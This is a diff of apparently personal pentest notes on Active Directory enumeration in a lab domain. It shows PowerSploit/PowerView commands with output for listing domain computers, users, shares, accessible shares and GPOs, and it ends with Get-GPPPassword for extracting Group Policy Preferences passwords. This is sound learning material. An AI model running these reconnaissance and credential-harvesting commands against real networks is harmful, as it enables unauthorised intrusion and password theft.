@@ -1,7 +1,7 @@
 
 # Active Directory Enumeration
 
-Get current Domain and Domain controller
+## Get current Domain and Domain controller
 
 	$var = [System.DirectoryServices.ActiveDirectory.Domain]
 	$var::GetCurrentDomain()
@@ -22,7 +22,7 @@ Powerview
 	Name                    : valhalla.local
 	
 
-Cet AD Computers, later it could be used for detecting subnets and ip
+## Cet AD Computers
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-NetComputer | select cn,operatingsystem
 	cn   operatingsystem
@@ -31,8 +31,15 @@ Cet AD Computers, later it could be used for detecting subnets and ip
 	THOR Windows 7 Professional
 	LOKI Windows 10 Pro
 
+Later it could be used for detecting subnets and ip. Script to resolv hostname to ip
 
-Get AD users and details
+	foreach($line in [System.IO.File]::ReadLines("C:\path\to\ip.txt"))
+	
+	{
+		   Resolve-DnsName $line > result.txt
+	}
+
+## Get AD users and details
 
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-DomainUser | select samaccountname, cn, title, description
@@ -93,7 +100,7 @@ Get AD users and details
 	lazyuser       lazyuser
 
 
-Get shares on AD enviroment
+## Get shares on AD environment
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Find-DomainShare
 
@@ -111,7 +118,7 @@ Get shares on AD enviroment
 	share             0                     loki.valhalla.local
 
 
-Get shares on AD only user has permission
+## Get shares on AD only user has permission
 
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Find-DomainShare -CheckShareAccess
@@ -127,7 +134,7 @@ Get shares on AD only user has permission
 
 
 
-Get GPO objects 
+## Get GPO objects 
 
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-DomainGPO | select displayname, gpcfilesyspath
@@ -142,7 +149,7 @@ Get GPO objects
 	Disable Windows Defender          \\valhalla.local\SysVol\valhalla.local\Policies\{AF7B0056-348A-45D1-A9D3-490C93DFD017}
 
 
-Get GPP password
+## Get GPP password
 
 	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> . .\Get-GPPPassword.ps1
 	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> Get-GPPPassword
